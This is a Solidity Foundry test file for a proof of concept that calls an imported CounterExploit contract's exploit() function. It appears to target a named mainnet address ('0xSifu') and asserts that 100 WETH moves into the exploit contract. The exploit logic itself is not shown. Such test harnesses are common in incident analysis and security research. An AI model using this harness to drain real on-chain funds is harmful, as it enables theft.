// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CounterExploit.sol";

interface IERC20 {
    function balanceOf(address spender) external returns (uint256);
}

contract CounterTest is Test {
    CounterExploit public CE;

    function setUp() public {
        CE = new CounterExploit();
    }

    function testSifu() public {
        uint256 initialBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(CE));
        CE.exploit(
            100_000_000_000_000_000_000,
            0,
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // weth
            0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1 // 0xSifu
        );
        uint256 afterBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(CE));
        assert(initialBalance + 100_000_000_000_000_000_000 == afterBalance);
    }
}
